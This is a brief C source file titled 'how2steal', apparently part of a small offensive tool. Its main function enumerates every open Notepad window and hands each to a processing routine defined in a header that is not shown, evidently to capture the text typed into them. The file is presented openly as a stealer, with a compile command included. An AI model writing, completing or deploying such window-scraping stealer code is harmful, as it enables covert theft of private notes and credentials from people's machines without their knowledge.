/*
    author: 
    hasbiyama (@3xploitZero)
    github.com/hasbiyama

    > gcc how2steal\how2steal.c -s -O2 -o how2steal.exe

*/

#include "processNotepadWindow.h"

int main() {
    HWND notepadWnd = FindWindowA("Notepad", NULL);
    if (notepadWnd == NULL) {
        noteSnitch();
    }

    int windowNumber = 0;
    int notepadTextBoxCount = 0;

    while (notepadWnd != NULL) {
        // Process each Notepad window
        processNotepadWindow(notepadWnd, &windowNumber, &notepadTextBoxCount);
        // Find the next Notepad window
        notepadWnd = FindWindowExA(NULL, notepadWnd, "Notepad", NULL);
    }

    return 0;
}